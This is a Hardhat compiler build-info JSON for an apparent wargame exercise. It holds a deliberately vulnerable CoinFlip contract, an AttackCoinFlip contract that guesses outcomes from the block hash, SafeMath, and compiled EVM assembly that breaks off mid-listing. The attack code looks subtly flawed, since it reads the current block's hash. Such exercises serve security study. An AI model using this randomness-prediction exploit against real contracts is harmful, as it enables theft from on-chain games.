{
	"id": "f47ce1f063773463152cc27a1281b31c",
	"_format": "hh-sol-build-info-1",
	"solcVersion": "0.8.13",
	"solcLongVersion": "0.8.13+commit.abaa5c0e",
	"input": {
		"language": "Solidity",
		"sources": {
			"CoinFlip/attackCoinFlip.sol": {
				"content": "pragma solidity ^0.8.0;\r\n\r\nimport '../Fallback/SafeMath.sol';\r\nimport './CoinFlip.sol';\r\ncontract AttackCoinFlip{\r\n    using SafeMath for uint256;\r\n    uint256 public guessingValue;\r\n    bool public guessing;\r\n    function guessTheCurrentBlockValue() public returns(uint256){\r\n        uint256 tmpOfCurrent = uint256(blockhash(block.number));\r\n        guessingValue = tmpOfCurrent.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);    \r\n        guessing = guessingValue == 1 ? true : false;    \r\n    }\r\n    function attack(address _contract) public  {\r\n        bool result = false;\r\n        CoinFlip C = CoinFlip(_contract);\r\n        result = C.flip(guessing);\r\n\r\n    }\r\n}"
			},
			"CoinFlip/CoinFlip.sol": {
				"content": "pragma solidity ^0.8.0;\r\n\r\nimport '../Fallback/SafeMath.sol';\r\n\r\ncontract CoinFlip {\r\n\r\n  using SafeMath for uint256;\r\n  uint256 public consecutiveWins;\r\n  uint256 lastHash;\r\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\r\n\r\n  constructor() public {\r\n    consecutiveWins = 0;\r\n  }\r\n\r\n  function flip(bool _guess) public returns (bool) {\r\n    uint256 blockValue = uint256(blockhash(block.number.sub(1)));\r\n\r\n    if (lastHash == blockValue) {\r\n      revert();\r\n    }\r\n\r\n    lastHash = blockValue;\r\n    uint256 coinFlip = blockValue.div(FACTOR);\r\n    bool side = coinFlip == 1 ? true : false;\r\n\r\n    if (side == _guess) {\r\n      consecutiveWins++;\r\n      return true;\r\n    } else {\r\n      consecutiveWins = 0;\r\n      return false;\r\n    }\r\n  }\r\n}"
			},
			"Fallback/SafeMath.sol": {
				"content": "// SPDX-License-Identifier: MIT\r\n// OpenZeppelin Contracts v4.4.1 (utils/math/SafeMath.sol)\r\n\r\npragma solidity ^0.8.0;\r\n\r\n// CAUTION\r\n// This version of SafeMath should only be used with Solidity 0.8 or later,\r\n// because it relies on the compiler's built in overflow checks.\r\n\r\n/**\r\n * @dev Wrappers over Solidity's arithmetic operations.\r\n *\r\n * NOTE: `SafeMath` is generally not needed starting with Solidity 0.8, since the compiler\r\n * now has built in overflow checking.\r\n */\r\nlibrary SafeMath {\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c < a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b > a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, with an overflow flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            // Gas optimization: this is cheaper than requiring 'a' not being zero, but the\r\n            // benefit is lost if 'b' is also tested.\r\n            // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the division of two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers, with a division by zero flag.\r\n     *\r\n     * _Available since v3.4._\r\n     */\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the addition of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `+` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Addition cannot overflow.\r\n     */\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the multiplication of two unsigned integers, reverting on\r\n     * overflow.\r\n     *\r\n     * Counterpart to Solidity's `*` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Multiplication cannot overflow.\r\n     */\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting when dividing by zero.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the subtraction of two unsigned integers, reverting with custom message on\r\n     * overflow (when the result is negative).\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {trySub}.\r\n     *\r\n     * Counterpart to Solidity's `-` operator.\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - Subtraction cannot overflow.\r\n     */\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b <= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the integer division of two unsigned integers, reverting with custom message on\r\n     * division by zero. The result is rounded towards zero.\r\n     *\r\n     * Counterpart to Solidity's `/` operator. Note: this function uses a\r\n     * `revert` opcode (which leaves remaining gas untouched) while Solidity\r\n     * uses an invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    /**\r\n     * @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\r\n     * reverting with custom message when dividing by zero.\r\n     *\r\n     * CAUTION: This function is deprecated because it requires allocating memory for the error\r\n     * message unnecessarily. For custom revert reasons use {tryMod}.\r\n     *\r\n     * Counterpart to Solidity's `%` operator. This function uses a `revert`\r\n     * opcode (which leaves remaining gas untouched) while Solidity uses an\r\n     * invalid opcode to revert (consuming all remaining gas).\r\n     *\r\n     * Requirements:\r\n     *\r\n     * - The divisor cannot be zero.\r\n     */\r\n    function mod(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b > 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}"
			}
		},
		"settings": {
			"optimizer": {
				"enabled": false,
				"runs": 200
			},
			"outputSelection": {
				"*": {
					"": [
						"ast"
					],
					"*": [
						"abi",
						"metadata",
						"devdoc",
						"userdoc",
						"evm.legacyAssembly",
						"evm.bytecode",
						"evm.deployedBytecode",
						"evm.methodIdentifiers",
						"evm.gasEstimates",
						"evm.assembly"
					]
				}
			}
		}
	},
	"output": {
		"contracts": {
			"CoinFlip/CoinFlip.sol": {
				"CoinFlip": {
					"abi": [
						{
							"inputs": [],
							"stateMutability": "nonpayable",
							"type": "constructor"
						},
						{
							"inputs": [],
							"name": "consecutiveWins",
							"outputs": [
								{
									"internalType": "uint256",
									"name": "",
									"type": "uint256"
								}
							],
							"stateMutability": "view",
							"type": "function"
						},
						{
							"inputs": [
								{
									"internalType": "bool",
									"name": "_guess",
									"type": "bool"
								}
							],
							"name": "flip",
							"outputs": [
								{
									"internalType": "bool",
									"name": "",
									"type": "bool"
								}
							],
							"stateMutability": "nonpayable",
							"type": "function"
						}
					],
					"devdoc": {
						"kind": "dev",
						"methods": {},
						"version": 1
					},
					"evm": {
						"assembly": "    /* \"CoinFlip/CoinFlip.sol\":65:793  contract CoinFlip {... */\n  mstore(0x40, 0x80)\n    /* \"CoinFlip/CoinFlip.sol\":194:271  57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x8000000000000000000000000000000000000000000000000000000000000000\n    /* \"CoinFlip/CoinFlip.sol\":177:271  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968 */\n  0x02\n  sstore\n    /* \"CoinFlip/CoinFlip.sol\":278:331  constructor() public {... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"CoinFlip/CoinFlip.sol\":324:325  0 */\n  0x00\n    /* \"CoinFlip/CoinFlip.sol\":306:321  consecutiveWins */\n  dup1\n    /* \"CoinFlip/CoinFlip.sol\":306:325  consecutiveWins = 0 */\n  dup2\n  swap1\n  sstore\n  pop\n    /* \"CoinFlip/CoinFlip.sol\":65:793  contract CoinFlip {... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"CoinFlip/CoinFlip.sol\":65:793  contract CoinFlip {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x1d263f67\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xe6f334d7\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"CoinFlip/CoinFlip.sol\":337:790  function flip(bool _guess) public returns (bool) {... */\n    tag_3:\n      tag_5\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_6\n      swap2\n      swap1\n      tag_7\n      jump\t// in\n    tag_6:\n      tag_8\n      jump\t// in\n    tag_5:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/CoinFlip.sol\":121:151  uint256 public consecutiveWins */\n    tag_4:\n      tag_11\n      tag_12\n      jump\t// in\n    tag_11:\n      mload(0x40)\n      tag_13\n      swap2\n      swap1\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"CoinFlip/CoinFlip.sol\":337:790  function flip(bool _guess) public returns (bool) {... */\n    tag_8:\n        /* \"CoinFlip/CoinFlip.sol\":380:384  bool */\n      0x00\n        /* \"CoinFlip/CoinFlip.sol\":393:411  uint256 blockValue */\n      dup1\n        /* \"CoinFlip/CoinFlip.sol\":432:451  block.number.sub(1) */\n      tag_16\n        /* \"CoinFlip/CoinFlip.sol\":449:450  1 */\n      0x01\n        /* \"CoinFlip/CoinFlip.sol\":432:444  block.number */\n      number\n        /* \"CoinFlip/CoinFlip.sol\":432:448  block.number.sub */\n      tag_17\n      swap1\n        /* \"CoinFlip/CoinFlip.sol\":432:451  block.number.sub(1) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_16:\n        /* \"CoinFlip/CoinFlip.sol\":422:452  blockhash(block.number.sub(1)) */\n      blockhash\n        /* \"CoinFlip/CoinFlip.sol\":414:453  uint256(blockhash(block.number.sub(1))) */\n      0x00\n      shr\n        /* \"CoinFlip/CoinFlip.sol\":393:453  uint256 blockValue = uint256(blockhash(block.number.sub(1))) */\n      swap1\n      pop\n        /* \"CoinFlip/CoinFlip.sol\":478:488  blockValue */\n      dup1\n        /* \"CoinFlip/CoinFlip.sol\":466:474  lastHash */\n      sload(0x01)\n        /* \"CoinFlip/CoinFlip.sol\":466:488  lastHash == blockValue */\n      sub\n        /* \"CoinFlip/CoinFlip.sol\":462:515  if (lastHash == blockValue) {... */\n      tag_18\n      jumpi\n        /* \"CoinFlip/CoinFlip.sol\":499:507  revert() */\n      0x00\n      dup1\n      revert\n        /* \"CoinFlip/CoinFlip.sol\":462:515  if (lastHash == blockValue) {... */\n    tag_18:\n        /* \"CoinFlip/CoinFlip.sol\":534:544  blockValue */\n      dup1\n        /* \"CoinFlip/CoinFlip.sol\":523:531  lastHash */\n      0x01\n        /* \"CoinFlip/CoinFlip.sol\":523:544  lastHash = blockValue */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip/CoinFlip.sol\":551:567  uint256 coinFlip */\n      0x00\n        /* \"CoinFlip/CoinFlip.sol\":570:592  blockValue.div(FACTOR) */\n      tag_19\n        /* \"CoinFlip/CoinFlip.sol\":585:591  FACTOR */\n      sload(0x02)\n        /* \"CoinFlip/CoinFlip.sol\":570:580  blockValue */\n      dup4\n        /* \"CoinFlip/CoinFlip.sol\":570:584  blockValue.div */\n      tag_20\n      swap1\n        /* \"CoinFlip/CoinFlip.sol\":570:592  blockValue.div(FACTOR) */\n      swap2\n      swap1\n      0xffffffff\n      and\n      jump\t// in\n    tag_19:\n        /* \"CoinFlip/CoinFlip.sol\":551:592  uint256 coinFlip = blockValue.div(FACTOR) */\n      swap1\n      pop\n        /* \"CoinFlip/CoinFlip.sol\":599:608  bool side */\n      0x00\n        /* \"CoinFlip/CoinFlip.sol\":623:624  1 */\n      0x01\n        /* \"CoinFlip/CoinFlip.sol\":611:619  coinFlip */\n      dup3\n        /* \"CoinFlip/CoinFlip.sol\":611:624  coinFlip == 1 */\n      eq\n        /* \"CoinFlip/CoinFlip.sol\":611:639  coinFlip == 1 ? true : false */\n      tag_21\n      jumpi\n        /* \"CoinFlip/CoinFlip.sol\":634:639  false */\n      0x00\n        /* \"CoinFlip/CoinFlip.sol\":611:639  coinFlip == 1 ? true : false */\n      jump(tag_22)\n    tag_21:\n        /* \"CoinFlip/CoinFlip.sol\":627:631  true */\n      0x01\n        /* \"CoinFlip/CoinFlip.sol\":611:639  coinFlip == 1 ? true : false */\n    tag_22:\n        /* \"CoinFlip/CoinFlip.sol\":599:639  bool side = coinFlip == 1 ? true : false */\n      swap1\n      pop\n        /* \"CoinFlip/CoinFlip.sol\":660:666  _guess */\n      dup5\n        /* \"CoinFlip/CoinFlip.sol\":652:666  side == _guess */\n      iszero\n      iszero\n        /* \"CoinFlip/CoinFlip.sol\":652:656  side */\n      dup2\n        /* \"CoinFlip/CoinFlip.sol\":652:666  side == _guess */\n      iszero\n      iszero\n      sub\n        /* \"CoinFlip/CoinFlip.sol\":648:785  if (side == _guess) {... */\n      tag_23\n      jumpi\n        /* \"CoinFlip/CoinFlip.sol\":677:692  consecutiveWins */\n      0x00\n      dup1\n        /* \"CoinFlip/CoinFlip.sol\":677:694  consecutiveWins++ */\n      dup2\n      sload\n      dup1\n      swap3\n      swap2\n      swap1\n      tag_24\n      swap1\n      tag_25\n      jump\t// in\n    tag_24:\n      swap2\n      swap1\n      pop\n      sstore\n      pop\n        /* \"CoinFlip/CoinFlip.sol\":710:714  true */\n      0x01\n        /* \"CoinFlip/CoinFlip.sol\":703:714  return true */\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump(tag_15)\n        /* \"CoinFlip/CoinFlip.sol\":648:785  if (side == _guess) {... */\n    tag_23:\n        /* \"CoinFlip/CoinFlip.sol\":755:756  0 */\n      0x00\n        /* \"CoinFlip/CoinFlip.sol\":737:752  consecutiveWins */\n      dup1\n        /* \"CoinFlip/CoinFlip.sol\":737:756  consecutiveWins = 0 */\n      dup2\n      swap1\n      sstore\n      pop\n        /* \"CoinFlip/CoinFlip.sol\":772:777  false */\n      0x00\n        /* \"CoinFlip/CoinFlip.sol\":765:777  return false */\n      swap4\n      pop\n      pop\n      pop\n      pop\n        /* \"CoinFlip/CoinFlip.sol\":337:790  function flip(bool _guess) public returns (bool) {... */\n    tag_15:\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"CoinFlip/CoinFlip.sol\":121:151  uint256 public consecutiveWins */\n    tag_12:\n      sload(0x00)\n      dup2\n      jump\t// out\n        /* \"Fallback/SafeMath.sol\":3213:3311  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_17:\n        /* \"Fallback/SafeMath.sol\":3271:3278  uint256 */\n      0x00\n        /* \"Fallback/SafeMath.sol\":3302:3303  b */\n      dup2\n        /* \"Fallback/SafeMath.sol\":3298:3299  a */\n      dup4\n        /* \"Fallback/SafeMath.sol\":3298:3303  a - b */\n      tag_28\n      swap2\n      swap1\n      tag_29\n      jump\t// in\n    tag_28:\n        /* \"Fallback/SafeMath.sol\":3291:3303  return a - b */\n      swap1\n      pop\n        /* \"Fallback/SafeMath.sol\":3213:3311  function sub(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"Fallback/SafeMath.sol\":3969:4067  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n    tag_20:\n        /* \"Fallback/SafeMath.sol\":4027:4034  uint256 */\n      0x00\n        /* \"Fallback/SafeMath.sol\":4058:4059  b */\n      dup2\n        /* \"Fallback/SafeMath.sol\":4054:4055  a */\n      dup4\n        /* \"Fallback/SafeMath.sol\":4054:4059  a / b */\n      tag_31\n      swap2\n      swap1\n      tag_32\n      jump\t// in\n    tag_31:\n        /* \"Fallback/SafeMath.sol\":4047:4059  return a / b */\n      swap1\n      pop\n        /* \"Fallback/SafeMath.sol\":3969:4067  function div(uint256 a, uint256 b) internal pure returns (uint256) {... */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_34:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:424   */\n    tag_36:\n        /* \"#utility.yul\":368:375   */\n      0x00\n        /* \"#utility.yul\":411:416   */\n      dup2\n        /* \"#utility.yul\":404:417   */\n      iszero\n        /* \"#utility.yul\":397:418   */\n      iszero\n        /* \"#utility.yul\":386:418   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:424   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":430:546   */\n    tag_37:\n        /* \"#utility.yul\":500:521   */\n      tag_50\n        /* \"#utility.yul\":515:520   */\n      dup2\n        /* \"#utility.yul\":500:521   */\n      tag_36\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":493:498   */\n      dup2\n        /* \"#utility.yul\":490:522   */\n      eq\n        /* \"#utility.yul\":480:540   */\n      tag_51\n      jumpi\n        /* \"#utility.yul\":536:537   */\n      0x00\n        /* \"#utility.yul\":533:534   */\n      dup1\n        /* \"#utility.yul\":526:538   */\n      revert\n        /* \"#utility.yul\":480:540   */\n    tag_51:\n        /* \"#utility.yul\":430:546   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":552:685   */\n    tag_38:\n        /* \"#utility.yul\":595:600   */\n      0x00\n        /* \"#utility.yul\":633:639   */\n      dup2\n        /* \"#utility.yul\":620:640   */\n      calldataload\n        /* \"#utility.yul\":611:640   */\n      swap1\n      pop\n        /* \"#utility.yul\":649:679   */\n      tag_53\n        /* \"#utility.yul\":673:678   */\n      dup2\n        /* \"#utility.yul\":649:679   */\n      tag_37\n      jump\t// in\n    tag_53:\n        /* \"#utility.yul\":552:685   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":691:1014   */\n    tag_7:\n        /* \"#utility.yul\":747:753   */\n      0x00\n        /* \"#utility.yul\":796:798   */\n      0x20\n        /* \"#utility.yul\":784:793   */\n      dup3\n        /* \"#utility.yul\":775:782   */\n      dup5\n        /* \"#utility.yul\":771:794   */\n      sub\n        /* \"#utility.yul\":767:799   */\n      slt\n        /* \"#utility.yul\":764:883   */\n      iszero\n      tag_55\n      jumpi\n        /* \"#utility.yul\":802:881   */\n      tag_56\n      tag_34\n      jump\t// in\n    tag_56:\n        /* \"#utility.yul\":764:883   */\n    tag_55:\n        /* \"#utility.yul\":922:923   */\n      0x00\n        /* \"#utility.yul\":947:997   */\n      tag_57\n        /* \"#utility.yul\":989:996   */\n      dup5\n        /* \"#utility.yul\":980:986   */\n      dup3\n        /* \"#utility.yul\":969:978   */\n      dup6\n        /* \"#utility.yul\":965:987   */\n      add\n        /* \"#utility.yul\":947:997   */\n      tag_38\n      jump\t// in\n    tag_57:\n        /* \"#utility.yul\":937:997   */\n      swap2\n      pop\n        /* \"#utility.yul\":893:1007   */\n      pop\n        /* \"#utility.yul\":691:1014   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1020:1129   */\n    tag_39:\n        /* \"#utility.yul\":1101:1122   */\n      tag_59\n        /* \"#utility.yul\":1116:1121   */\n      dup2\n        /* \"#utility.yul\":1101:1122   */\n      tag_36\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":1096:1099   */\n      dup3\n        /* \"#utility.yul\":1089:1123   */\n      mstore\n        /* \"#utility.yul\":1020:1129   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1135:1345   */\n    tag_10:\n        /* \"#utility.yul\":1222:1226   */\n      0x00\n        /* \"#utility.yul\":1260:1262   */\n      0x20\n        /* \"#utility.yul\":1249:1258   */\n      dup3\n        /* \"#utility.yul\":1245:1263   */\n      add\n        /* \"#utility.yul\":1237:1263   */\n      swap1\n      pop\n        /* \"#utility.yul\":1273:1338   */\n      tag_61\n        /* \"#utility.yul\":1335:1336   */\n      0x00\n        /* \"#utility.yul\":1324:1333   */\n      dup4\n        /* \"#utility.yul\":1320:1337   */\n      add\n        /* \"#utility.yul\":1311:1317   */\n      dup5\n        /* \"#utility.yul\":1273:1338   */\n      tag_39\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":1135:1345   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1351:1428   */\n    tag_40:\n        /* \"#utility.yul\":1388:1395   */\n      0x00\n        /* \"#utility.yul\":1417:1422   */\n      dup2\n        /* \"#utility.yul\":1406:1422   */\n      swap1\n      pop\n        /* \"#utility.yul\":1351:1428   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1434:1552   */\n    tag_41:\n        /* \"#utility.yul\":1521:1545   */\n      tag_64\n        /* \"#utility.yul\":1539:1544   */\n      dup2\n        /* \"#utility.yul\":1521:1545   */\n      tag_40\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":1516:1519   */\n      dup3\n        /* \"#utility.yul\":1509:1546   */\n      mstore\n        /* \"#utility.yul\":1434:1552   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1558:1780   */\n    tag_14:\n        /* \"#utility.yul\":1651:1655   */\n      0x00\n        /* \"#utility.yul\":1689:1691   */\n      0x20\n        /* \"#utility.yul\":1678:1687   */\n      dup3\n        /* \"#utility.yul\":1674:1692   */\n      add\n        /* \"#utility.yul\":1666:1692   */\n      swap1\n      pop\n        /* \"#utility.yul\":1702:1773   */\n      tag_66\n        /* \"#utility.yul\":1770:1771   */\n      0x00\n        /* \"#utility.yul\":1759:1768   */\n      dup4\n        /* \"#utility.yul\":1755:1772   */\n      add\n        /* \"#utility.yul\":1746:1752   */\n      dup5\n        /* \"#utility.yul\":1702:1773   */\n      tag_41\n      jump\t// in\n    tag_66:\n        /* \"#utility.yul\":1558:1780   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1786:1966   */\n    tag_42:\n        /* \"#utility.yul\":1834:1911   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":1831:1832   */\n      0x00\n        /* \"#utility.yul\":1824:1912   */\n      mstore\n        /* \"#utility.yul\":1931:1935   */\n      0x11\n        /* \"#utility.yul\":1928:1929   */\n      0x04\n        /* \"#utility.yul\":1921:1936   */\n      mstore\n        /* \"#utility.yul\":1955:1959   */\n      0x24\n        /* \"#utility.yul\":1952:1953   */\n      0x00\n        /* \"#utility.yul\":1945:1960   */\n      revert\n        /* \"#utility.yul\":1972:2205   */\n    tag_25:\n        /* \"#utility.yul\":2011:2014   */\n      0x00\n        /* \"#utility.yul\":2034:2058   */\n      tag_69\n        /* \"#utility.yul\":2052:2057   */\n      dup3\n        /* \"#utility.yul\":2034:2058   */\n      tag_40\n      jump\t// in\n    tag_69:\n        /* \"#utility.yul\":2025:2058   */\n      swap2\n      pop\n        /* \"#utility.yul\":2080:2146   */\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":2073:2078   */\n      dup3\n        /* \"#utility.yul\":2070:2147   */\n      sub\n        /* \"#utility.yul\":2067:2170   */\n      tag_70\n      jumpi\n        /* \"#utility.yul\":2150:2168   */\n      tag_71\n      tag_42\n      jump\t// in\n    tag_71:\n        /* \"#utility.yul\":2067:2170   */\n    tag_70:\n        /* \"#utility.yul\":2197:2198   */\n      0x01\n        /* \"#utility.yul\":2190:2195   */\n      dup3\n        /* \"#utility.yul\":2186:2199   */\n      add\n        /* \"#utility.yul\":2179:2199   */\n      swap1\n      pop\n        /* \"#utility.yul\":1972:2205   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2211:2402   */\n    tag_29:\n        /* \"#utility.yul\":2251:2255   */\n      0x00\n        /* \"#utility.yul\":2271:2291   */\n      tag_73\n        /* \"#utility.yul\":2289:2290   */\n      dup3\n        /* \"#utility.yul\":2271:2291   */\n      tag_40\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":2266:2291   */\n      swap2\n      pop\n        /* \"#utility.yul\":2305:2325   */\n      tag_74\n        /* \"#utility.yul\":2323:2324   */\n      dup4\n        /* \"#utility.yul\":2305:2325   */\n      tag_40\n      jump\t// in\n    tag_74:\n        /* \"#utility.yul\":2300:2325   */\n      swap3\n      pop\n        /* \"#utility.yul\":2344:2345   */\n      dup3\n        /* \"#utility.yul\":2341:2342   */\n      dup3\n        /* \"#utility.yul\":2338:2346   */\n      lt\n        /* \"#utility.yul\":2335:2369   */\n      iszero\n      tag_75\n      jumpi\n        /* \"#utility.yul\":2349:2367   */\n      tag_76\n      tag_42\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":2335:2369   */\n    tag_75:\n        /* \"#utility.yul\":2394:2395   */\n      dup3\n        /* \"#utility.yul\":2391:2392   */\n      dup3\n        /* \"#utility.yul\":2387:2396   */\n      sub\n        /* \"#utility.yul\":2379:2396   */\n      swap1\n      pop\n        /* \"#utility.yul\":2211:2402   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2408:2588   */\n    tag_43:\n        /* \"#utility.yul\":2456:2533   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":2453:2454   */\n      0x00\n        /* \"#utility.yul\":2446:2534   */\n      mstore\n        /* \"#utility.yul\":2553:2557   */\n      0x12\n        /* \"#utility.yul\":2550:2551   */\n      0x04\n        /* \"#utility.yul\":2543:2558   */\n      mstore\n        /* \"#utility.yul\":2577:2581   */\n      0x24\n        /* \"#utility.yul\":2574:2575   */\n      0x00\n        /* \"#utility.yul\":2567:2582   */\n      revert\n        /* \"#utility.yul\":2594:2779   */\n    tag_32:\n        /* \"#utility.yul\":2634:2635   */\n      0x00\n        /* \"#utility.yul\":2651:2671   */\n      tag_79\n        /* \"#utility.yul\":2669:2670   */\n      dup3\n        /* \"#utility.yul\":2651:2671   */\n      tag_40\n      jump\t// in\n    tag_79:\n        /* \"#utility.yul\":2646:2671   */\n      swap2\n      pop\n        /* \"#utility.yul\":2685:2705   */\n      tag_80\n        /* \"#utility.yul\":2703:2704   */\n      dup4\n        /* \"#utility.yul\":2685:2705   */\n      tag_40\n      jump\t// in\n    tag_80:\n        /* \"#utility.yul\":2680:2705   */\n      swap3\n      pop\n        /* \"#utility.yul\":2724:2725   */\n      dup3\n        /* \"#utility.yul\":2714:2749   */\n      tag_81\n      jumpi\n        /* \"#utility.yul\":2729:2747   */\n      tag_82\n      tag_43\n      